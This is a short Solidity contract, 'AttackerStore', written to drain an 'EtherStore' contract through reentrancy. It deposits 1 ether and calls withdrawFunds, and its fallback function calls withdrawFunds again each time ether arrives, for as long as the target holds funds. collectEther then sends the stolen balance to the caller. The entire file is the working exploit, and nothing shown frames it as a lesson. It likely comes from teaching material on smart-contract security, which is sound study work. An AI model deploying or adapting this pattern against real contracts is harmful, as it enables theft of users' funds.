pragma solidity 0.4.26;

import "./EtherStore.sol";

contract AttackerStore {
  EtherStore public etherStore;

  // intialize the etherStore variable with the contract address
  constructor(address _etherStoreAddress) public {
    etherStore = EtherStore(_etherStoreAddress);
  }

  function attackEtherStore() public payable {
    etherStore.depositFunds.value(1 ether)();

    etherStore.withdrawFunds(1 ether);
  }

  // fallback function - where the magic happens
  function () public payable {
    if (address(etherStore).balance >= 1 ether) {
      etherStore.withdrawFunds(1 ether);
    }
  }

  function collectEther() public {
    msg.sender.transfer(address(this).balance);
  }

}
